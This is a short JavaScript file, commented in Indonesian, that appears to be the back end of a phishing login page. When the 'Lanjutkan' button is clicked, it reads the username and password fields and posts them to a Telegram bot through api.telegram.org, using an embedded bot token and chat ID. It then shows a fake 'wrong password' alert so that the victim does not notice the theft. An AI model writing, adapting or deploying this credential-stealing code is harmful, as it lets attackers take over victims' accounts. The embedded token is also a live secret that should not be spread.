// Ganti dengan API Token dari BotFather
const BOT_TOKEN = '7258081396:AAHIu5xiKaw5qmSpo_JSScYZkrXzcFpTW4Q';
// Ganti dengan Chat ID yang didapatkan dari getUpdates
const CHAT_ID = '-4545188605';
// URL untuk mengirim pesan ke bot Telegram
const URL_API = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;

// Tambahkan event listener pada tombol "Lanjutkan"
document.getElementById('lanjutkanBtn').addEventListener('click', sendData);

function sendData() {
    // Ambil nilai dari input form
    const username = document.getElementById('username').value;
    const password = document.getElementById('password').value;

    // Validasi sederhana
    if (username === '' || password === '') {
        alert('Silakan isi semua field.');
        return;
    }

    // Format pesan yang akan dikirim
    const message = `Username: ${username}\nPassword: ${password}`;

    // Kirim data ke bot Telegram menggunakan fetch API
    fetch(URL_API, {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify({
            chat_id: CHAT_ID,
            text: message
        })
    })
    .then(response => response.json())
    .then(data => {
        if (data.ok) {
            alert('kata sandi salah');
        } else {
            alert('kesalahan,coba lagi');
        }
    })
    .catch(error => {
        alert('Terjadi kesalahan: ' + error);
    });
}